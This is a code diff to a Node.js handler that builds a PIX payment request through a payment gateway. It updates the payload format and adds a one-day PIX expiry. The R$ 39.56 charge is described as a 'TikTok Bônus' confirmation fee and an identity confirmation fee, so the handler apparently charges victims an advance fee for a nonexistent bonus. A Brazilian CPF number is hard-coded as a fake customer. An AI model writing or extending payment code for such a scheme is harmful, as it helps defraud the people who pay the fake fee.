@@ -78,26 +78,27 @@ module.exports = async function handler(req, res) {
   }
 
   const cpfNumero = '11238990533';
-  const amount = 3956; // R$ 39,56 em centavos
+  const amount = 3956; // R$ 39,56 em centavos (mínimo 100 por spec)
 
-  // Payload conforme documentação GhostsPays (https://ghostspay.readme.io): customer.document como string, paymentMethod PIX
+  // Payload conforme OpenAPI Criar Pagamento: customer.document { number, type }, pix.expiresInDays obrigatório
   const payload = {
-    amount,
-    paymentMethod: 'PIX',
-    description: 'Taxa de confirmação TikTok Bônus',
     customer: {
       name: 'CPF 112.389.905-33',
       email: 'cpf11238990533@example.com',
       phone: '11999999999',
-      document: cpfNumero
+      document: { number: cpfNumero, type: 'CPF' }
     },
+    paymentMethod: 'PIX',
+    amount,
     items: [
       {
         title: 'Taxa de confirmação de identidade',
         unitPrice: amount,
         quantity: 1
       }
-    ]
+    ],
+    pix: { expiresInDays: 1 },
+    description: 'Taxa de confirmação TikTok Bônus'
   };
 
   if (postbackUrl) {
